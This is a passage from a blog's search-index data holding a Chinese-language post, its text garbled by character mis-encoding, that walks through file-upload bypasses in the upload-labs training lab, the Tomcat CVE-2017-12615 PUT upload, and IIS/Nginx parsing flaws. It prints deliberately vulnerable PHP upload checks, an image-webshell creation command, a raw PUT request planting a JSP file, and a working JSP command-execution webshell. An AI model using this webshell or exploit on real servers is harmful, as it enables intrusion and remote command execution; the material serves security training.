","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"22WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹å†…å®¹é€»è¾‘æ•°ç»„ç»•è¿‡","slug":"22WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹å†…å®¹é€»è¾‘æ•°ç»„ç»•è¿‡","date":"2021-09-21T02:31:27.000Z","updated":"2021-09-21T06:01:27.003Z","comments":true,"path":"2021/09/21/22WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹å†…å®¹é€»è¾‘æ•°ç»„ç»•è¿‡/","link":"","permalink":"https://al0nez.github.io/2021/09/21/22WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å›¾ç‰‡ä¸€å¥è¯åˆ¶ä½œæ–¹æ³•ï¼š1copy 1.png /b + shell.php /a webshell.jpg å›¾ç‰‡é©¬æ–‡ä»¶å¤´æ£€æµ‹å›¾ç‰‡é©¬éœ€è¦åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¥æ‰§è¡Œä¸€å¥è¯ï¼Œå•çº¯çš„ä¸Šä¼ å›¾ç‰‡é©¬æ˜¯ä¸å¯ä»¥æ‰§è¡Œçš„ï¼Œå’Œæ­£å¸¸å›¾ç‰‡æ²¡ä»€ä¹ˆåŒºåˆ« 1http://127.0.0.1/upload-labs/Pass-13/index.php æ£€æµ‹å‡½æ•° 1234567891011121314151617181920212223242526272829303132333435363738394041function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ï¼Œè·å–æ–‡ä»¶ç±»å‹ fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_type = getReailFileType($temp_file); if($file_type == &#x27;unknown&#x27;)&#123; $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;; &#125;else&#123; $img_path = $UPLOAD_ADDR.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;//å°†å‰é¢åˆ¤æ–­çš„æ–‡ä»¶ç±»å‹æ‹¼æ¥ if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = &quot;ä¸Šä¼ å¤±è´¥&quot;; &#125; &#125;&#125; ç»•è¿‡ è¿™é‡Œåªéœ€è¦ä¼ªé€ ä¸€ä¸ªæ–‡ä»¶å¤´æ˜¯å›¾ç‰‡æ ¼å¼å°±å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯æœ€åæ‹¼æ¥çš„æ—¶å€™æ˜¯æ ¹æ®åˆ¤æ–­æ‹¼æ¥çš„ï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦é…åˆæ–‡ä»¶åŒ…å«æ‰å¯ä»¥æ‰§è¡Œshellã€‚å½“ç„¶è¿™é‡Œä¸Šä¼ å›¾ç‰‡é©¬ä¹Ÿå¯ä»¥ã€‚ getimagesizeå‡½æ•°ç»•è¿‡getimagesize() å‡½æ•°å°†æµ‹å®šä»»ä½• GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP å›¾åƒæ–‡ä»¶çš„å¤§å°å¹¶è¿”å›å›¾åƒçš„å°ºå¯¸ä»¥åŠæ–‡ä»¶ç±»å‹åŠå›¾ç‰‡é«˜åº¦ä¸å®½åº¦ã€‚å‡½æ•°æˆåŠŸè¿”å›çš„å°±æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ã€‚ 1http://127.0.0.1/upload-labs/Pass-14/index.php æ£€æµ‹ä»£ç  1234567891011121314151617181920212223242526272829303132function isImage($filename)&#123; $types = &#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext))&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $res = isImage($temp_file); if(!$res)&#123; $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;; &#125;else&#123; $img_path = $UPLOAD_ADDR.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = &quot;ä¸Šä¼ å¤±è´¥&quot;; &#125; &#125;&#125; ç»•è¿‡æ–¹æ³•è¯¥å‡½æ•°ä¼šè¿”å›å›¾ç‰‡çš„ä¿¡æ¯ï¼Œæ‰€æœ‰å¦‚æœä¸ä¸Šä¼ å›¾ç‰‡é©¬æ˜¯ç»•ä¸è¿‡å»çš„ã€‚ ç»•è¿‡ exif_imagetypeå‡½æ•°ç»•è¿‡1http://127.0.0.1/upload-labs/Pass-15/index.php æ£€æµ‹ä»£ç  123456789101112131415161718192021222324252627282930313233343536function isImage($filename)&#123; //éœ€è¦å¼€å¯php_exifæ¨¡å— $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $res = isImage($temp_file); if(!$res)&#123; $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;; &#125;else&#123; $img_path = $UPLOAD_ADDR.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = &quot;ä¸Šä¼ å¤±è´¥&quot;; &#125; &#125;&#125; exif_imagetype â€” åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹å¹¶ä¸”ä¼šåˆ¤æ–­ä»–çš„ç­¾å ç»•è¿‡æ–¹æ³•é€šè¿‡ä¸Šä¼ å›¾ç‰‡é©¬ç»•è¿‡ äºŒæ¬¡æ¸²æŸ“åŸç†ï¼šå°†ä¸€ä¸ªæ­£å¸¸æ˜¾ç¤ºçš„å›¾ç‰‡ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚å¯»æ‰¾å›¾ç‰‡è¢«æ¸²æŸ“åä¸åŸå§‹å›¾ç‰‡éƒ¨åˆ†å¯¹æ¯”ä»ç„¶ç›¸åŒçš„æ•°æ®å—éƒ¨åˆ†ï¼Œå°†Webshellä»£ç æ’åœ¨è¯¥éƒ¨åˆ†ï¼Œç„¶åä¸Šä¼ ã€‚å…·ä½“å®ç°éœ€è¦è‡ªå·±ç¼–å†™Pythonç¨‹åºï¼Œäººå·¥å°è¯•åŸºæœ¬æ˜¯ä¸å¯èƒ½æ„é€ å‡ºèƒ½ç»•è¿‡æ¸²æŸ“å‡½æ•°çš„å›¾ç‰‡webshellçš„ã€‚ æ£€æµ‹ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„ $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]; $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $target_path=$UPLOAD_ADDR.basename($filename); // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å $fileext= substr(strrchr($filename,&quot;.&quot;),1); //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; $newimagepath = $UPLOAD_ADDR.$newfilename; imagejpeg($im,$newimagepath); //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å¤±è´¥ï¼&quot;; &#125; &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; $newimagepath = $UPLOAD_ADDR.$newfilename; imagepng($im,$newimagepath); //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å¤±è´¥ï¼&quot;; &#125; &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; $newimagepath = $UPLOAD_ADDR.$newfilename; imagegif($im,$newimagepath); //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å¤±è´¥ï¼&quot;; &#125; &#125;else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;; &#125;&#125; ä¸Šä¼ gifå°†&lt;?php phpinfo(); ?&gt;æ·»åŠ åˆ°111.gifçš„å°¾éƒ¨. æˆåŠŸä¸Šä¼ å«æœ‰ä¸€å¥è¯çš„111.gif,ä½†æ˜¯è¿™å¹¶æ²¡æœ‰æˆåŠŸ.æˆ‘ä»¬å°†ä¸Šä¼ çš„å›¾ç‰‡ä¸‹è½½åˆ°æœ¬åœ°. å¯ä»¥çœ‹åˆ°ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶åå·²ç»å˜åŒ–,æ‰€ä»¥è¿™æ˜¯ç»è¿‡äºŒæ¬¡æ¸²æŸ“çš„å›¾ç‰‡.æˆ‘ä»¬ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨å°†å…¶æ‰“å¼€. å¯ä»¥å‘ç°,æˆ‘ä»¬åœ¨gifæœ«ç«¯æ·»åŠ çš„phpä»£ç å·²ç»è¢«å»é™¤. å…³äºç»•è¿‡gifçš„äºŒæ¬¡æ¸²æŸ“,æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°æ¸²æŸ“å‰åæ²¡æœ‰å˜åŒ–çš„ä½ç½®,ç„¶åå°†phpä»£ç å†™è¿›å»,å°±å¯ä»¥æˆåŠŸä¸Šä¼ å¸¦æœ‰phpä»£ç çš„å›¾ç‰‡äº†. ç»è¿‡å¯¹æ¯”,è“è‰²éƒ¨åˆ†æ˜¯æ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„, æˆ‘ä»¬å°†ä»£ç å†™åˆ°è¯¥ä½ç½®. ä¸Šä¼ ååœ¨ä¸‹è½½åˆ°æœ¬åœ°ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ å¯ä»¥çœ‹åˆ°phpä»£ç æ²¡æœ‰è¢«å»é™¤.æˆåŠŸä¸Šä¼ å›¾ç‰‡é©¬ã€‚ å‚è€ƒè¿æ¥1https://xz.aliyun.com/t/2657#toc-13 æ¡ä»¶ç«äº‰12http://127.0.0.1/upload-labs/Pass-17/index.phphttp://127.0.0.1/upload-labs/Pass-18/index.php æ£€æµ‹ä»£ç 123456789101112131415161718192021222324$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); unlink($upload_file); $is_upload = true; &#125;else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼&#x27;; &#125;&#125; è¿™é‡Œæ˜¯å°†æ–‡ä»¶å…ˆä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œå†å»æ¯”è¾ƒæ˜¯å¦ç¬¦åˆæ¡ä»¶ï¼Œå¦‚æœç¬¦åˆå°±é‡å‘½åï¼Œä¸ç¬¦åˆå°±åˆ é™¤æ‰ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¡ä»¶ç«äº‰ï¼Œä¸€ç›´ç»™æœåŠ¡å™¨å‘é€æ•°æ®åŒ…ï¼Œå°±å¯ä»¥åœ¨ä»–åˆ é™¤ä¹‹å‰è®¿é—®åˆ° ç»•è¿‡æ–¹æ³•é€šè¿‡ä¸åœçš„ç»™æœåŠ¡å™¨å‘åŒ…ï¼Œä¸Šä¼ webshellï¼Œè®©ä»–æ¥ä¸åŠåˆ é™¤ï¼Œå°±å¯ä»¥è®¿é—®äº†ã€‚ ç›®å½•å‘½å-x.php/.1http://127.0.0.1/upload-labs/Pass-19/index.php æ£€æµ‹ä»£ç è¿™å…³æ–‡ä»¶åå¯ä»¥è‡ªå·±å®šä¹‰ï¼Œä½†æ˜¯æœ‰è¿‡æ»¤ï¼Œä½†æ˜¯æ–‡ä»¶åæœ€åä¼šå’Œè·¯å¾„è¿›è¡Œæ‹¼æ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡%00ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥é€šè¿‡x.php/.çš„æ–¹å¼ç»•è¿‡ï¼Œè¿™ç§æ–¹å¼åœ¨ä»£ç ä¸­ç›¸å½“äºx.phpæ˜¯ç›®å½•ï¼Œç‚¹æ˜¯æ–‡ä»¶åï¼Œæœ€åæ£€æµ‹çš„åç¼€æ˜¯php/.ä½†æ˜¯åœ¨windowsä¸­x.php/.åˆä¼šè¢«å½“ä½œæ˜¯æ–‡ä»¶åã€‚æ‰€ä»¥æœ€ååˆå˜æˆäº†x.php 123456789101112131415161718192021222324is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#x27;save_name&#x27;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27; .$file_name; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼&#x27;; &#125; &#125;else&#123; $msg = &#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç»•è¿‡%00æˆªæ–­ ç›®å½•æ–¹å¼ç»•è¿‡ è„šæœ¬å‡½æ•°æ¼æ´-CVE-2015-2348 æ•°ç»„æ¥å—+ç›®å½•å‘½åæ£€æµ‹ä»£ç 123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //æ£€æŸ¥MIME $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;; &#125;else&#123; //æ£€æŸ¥æ–‡ä»¶å $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); &#125; $ext = end($file); $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = &quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;;&#125; ç»•è¿‡å…³é”®ç‚¹åœ¨äºä»¥ä¸‹ä»£ç ï¼š 123if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); &#125; å¦‚æœ$fileä¸æ˜¯æ•°ç»„ï¼Œå°±ä¼šä»¥.åˆ†å‰²è¢«å¼„æˆæ•°ç»„,å‡å¦‚å›¾ç‰‡åä¸ºxx.jpg,é‚£ä¹ˆæ•°ç»„å°±æ˜¯ 1$file=[&#x27;xx&#x27;,&#x27;.&#x27;,&#x27;jpg&#x27;] å¦‚æœæˆ‘ä»¬è¿™æ ·æ„é€ : é‚£ä¹ˆæ‰§è¡Œè¿™ä¸ªçš„æ—¶å€™$fileå°±ä¼šç­‰äº$_POST[&#39;save_name&#39;]ï¼Œæ­¤æ—¶$fileå°±æ˜¯æ•°ç»„äº†ã€‚ 1$file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; è€Œå–åç¼€å°±ä¼šå»åˆ°æ•°ç»„çš„æœ€åä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯jpgï¼Œç„¶åå°±ç»•è¿‡äº†æ£€æµ‹ 1$ext = end($file); æœ€åæ‹¼æ¥åå­—çš„æ—¶å€™å°±æ˜¯aaaaa.php/äº†ï¼Œæ‰€æœ‰æœ€åæ–‡ä»¶å°±æ˜¯aaaaa.php/ 1$file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; CVE-2017-12615-ä¸Šä¼ -TomcatåŸºæœ¬ä¿¡æ¯ æ¼æ´åç§°ï¼šTomcatä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ¼æ´ç¼–å·ï¼šCVE-2017-12615 æ¼æ´å½±å“ï¼šä¸Šä¼ åŒ…å«ä»»æ„ä»£ç çš„æ–‡ä»¶ï¼Œå¹¶è¢«æœåŠ¡å™¨æ‰§è¡Œã€‚ å½±å“å¹³å°ï¼šWindows å½±å“ç‰ˆæœ¬ï¼šApache Tomcat 7.0.0 - 7.0.81 æµ‹è¯•è¿‡ç¨‹å¼€å¯HTTP PUT ä¿®æ”¹Tomcat 7.0/conf/web.xmlæ–‡ä»¶ 1234567891011121314151617181920æ¼æ´æœ¬è´¨Tomcaté…ç½®äº†å¯å†™ï¼ˆreadonly=falseï¼‰ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥å¾€æœåŠ¡å™¨å†™æ–‡ä»¶ï¼šâ€‹```&lt;servlet&gt; &lt;servlet-name&gt;default&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;debug&lt;/param-name&gt; &lt;param-value&gt;0&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;listings&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; //è¿™é‡Œ &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt; å½“ç„¶å› ä¸ºæ˜¯ç”¨vulhubæ­å»ºçš„ï¼Œæ‰€æœ‰å¼€å¯ç¯å¢ƒçš„æ—¶å€™å·²ç»ä¿®æ”¹è¿‡äº†ã€‚ æ¼æ´å¤ç°è¿™é‡Œéœ€è¦å°†shellå­—ç¬¦ä¸²æ”¹ä¸ºjspåé—¨ 1234567891011121314ç›´æ¥å‘é€ä»¥ä¸‹æ•°æ®åŒ…å³å¯åœ¨Webæ ¹ç›®å½•å†™å…¥shellï¼šâ€‹```PUT /1.jsp/ HTTP/1.1Host: your-ip:8080Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 5shellâ€‹``` æˆ‘è¿™é‡Œä¿®æ”¹çš„æ˜¯shellæ˜¯ å¯†ç æ˜¯023ï¼Œé€šè¿‡iè¿›è¡Œä¼ å‚ è¯·æ±‚ï¼šhttp://192.168.47.156:8080/1.jsp?pwd=023&amp;i=ls 123456789101112&lt;% if ( &quot;023&quot; .equals(request.getParameter( &quot;pwd&quot; )))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter( &quot;i&quot; )).getInputStream(); int a = - 1 ; byte [] b = new byte [ 2048 ]; out.print( &quot;&lt;pre&gt;&quot; ); while ((a=in.read(b))!=- 1 )&#123; out.println( new String(b)); &#125; out.print( &quot;&lt;/pre&gt;&quot; ); &#125;%&gt; å‚è€ƒé“¾æ¥12https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5https://www.6b8.me/index.php?m=home&amp;c=article&amp;a=index&amp;id=376 ä¸­é—´ä»¶è§£ææ¼æ´+é…åˆæ–‡ä»¶ä¸Šä¼ æµ‹è¯• IIS-ä¸Šä¼ -è§£æ(IIS5.xâ€“6.x)å¦‚æœæ˜¯ä»¥image.asp/qq.jpgä¸Šä¼ é‚£ä¹ˆimage.aspç›®å½•ä¸‹ä¸ç®¡æ˜¯ä»€ä¹ˆæ–‡ä»¶éƒ½ä¼šè¢«å°±ä¼šè¢«å½“åšaspè§£æï¼Œä¾‹å¦‚è¿™é‡Œçš„qq.jpgï¼Œå°±ä¼šè¢«å½“åšaspè¢«è§£æã€‚å¦‚æœæ–‡ä»¶æ˜¯ä»¥image.asp:jpgæˆ–xxx.aspx;xxjpgå‘½åè¢«ä¸Šä¼ ï¼Œé‚£ä¹ˆæ­¤æ–‡ä»¶ä¼šè¢«å½“åšaspæ‰§è¡Œ æ³¨:aspå¯ä»¥æ¢åšphpå¦‚æœæ¢äº†phpé‚£ä¹ˆå°±å½“phpæ‰§è¡Œ Nginx-ä¸Šä¼ -è§£æè¿™ä¸€æ¼æ´æ˜¯ç”±äºNginxä¸­phpé…ç½®ä¸å½“è€Œé€ æˆçš„ï¼Œä¸Nginxç‰ˆæœ¬æ— å…³ï¼Œä½†åœ¨é«˜ç‰ˆæœ¬çš„phpä¸­ï¼Œç”±äºâ€œsecurity.limit_extensionsâ€çš„å¼•å…¥ï¼Œä½¿å¾—è¯¥æ¼æ´éš¾ä»¥è¢«æˆåŠŸåˆ©ç”¨ã€‚ php.iniæ–‡ä»¶ä¸­cgi.fix_pathinfoçš„å€¼é»˜è®¤ä¸º1ï¼Œä¼šå¯¼è‡´è§£ææ¼æ´ è¿˜æœ‰ä¸€ä¸ªæ˜¯ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´ 1xxx.jpg%00.php (Nginx &lt;8.03 ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´) IIS7.5-ä¸Šä¼ -è§£æIIS7.5çš„æ¼æ´ä¸nginxçš„ç±»ä¼¼ï¼Œéƒ½æ˜¯ç”±äºphpé…ç½®æ–‡ä»¶ä¸­ï¼Œå¼€å¯äº†cgi.fix_pathinfoï¼Œè€Œè¿™å¹¶ä¸æ˜¯nginxæˆ–è€…iis7.5æœ¬èº«çš„æ¼æ´ã€‚ php.inié‡Œé»˜è®¤cgi.fix_pathinfo=1ï¼Œå¯¹å…¶è¿›è¡Œè®¿é—®çš„æ—¶å€™ï¼Œåœ¨URLè·¯å¾„åæ·»åŠ .phpåç¼€åä¼šå½“åšphpæ–‡ä»¶è¿›è¡Œè§£æï¼Œæ¼æ´ç”±æ­¤äº§ç”Ÿ 